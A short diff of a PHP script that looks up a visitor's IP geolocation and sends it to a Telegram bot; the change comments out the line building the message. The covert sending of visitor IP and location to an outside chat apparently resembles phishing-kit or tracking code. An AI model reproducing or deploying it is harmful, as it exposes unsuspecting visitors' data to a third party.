@@ -24,7 +24,7 @@ $REGION  = $IP_LOOKUP->region . "\r\n";
 $STATE   = $IP_LOOKUP->regionName . "\r\n";
 $ZIPCODE = $IP_LOOKUP->zip . "\r\n";
 
-$msg=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;
+//$msg=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;
 
 file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );
 
